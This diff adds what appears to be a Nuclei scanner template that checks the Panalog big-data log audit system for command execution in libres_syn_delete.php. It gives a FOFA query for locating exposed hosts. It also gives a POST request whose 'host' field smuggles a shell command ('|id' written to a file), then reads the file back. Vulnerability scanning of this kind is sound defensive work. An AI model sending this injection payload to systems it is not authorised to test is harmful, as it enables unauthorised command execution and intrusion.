@@ -1,0 +1,34 @@
+id: Panalog-RCE
+
+info:
+  name: Panalog大数据日志审计系统libres_syn_delete.php存在命令执行
+  author: changge
+  severity: high
+  description: Panalog大数据日志审计系统libres_syn_delete.php存在命令执行
+  metadata:
+    fofa-query: app="Panabit-Panalog"
+
+
+requests:
+  - raw:
+      - |
+        POST /content-apply/libres_syn_delete.php HTTP/1.1
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Content-Length: 33
+        Content-Type: application/x-www-form-urlencoded
+
+        token=1&id=2&host=|id >{{randstr}}.txt
+
+      - |
+        GET /content-apply/{{randstr}}.txt HTTP/1.1
+        Host:{{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, 'uid')"
+
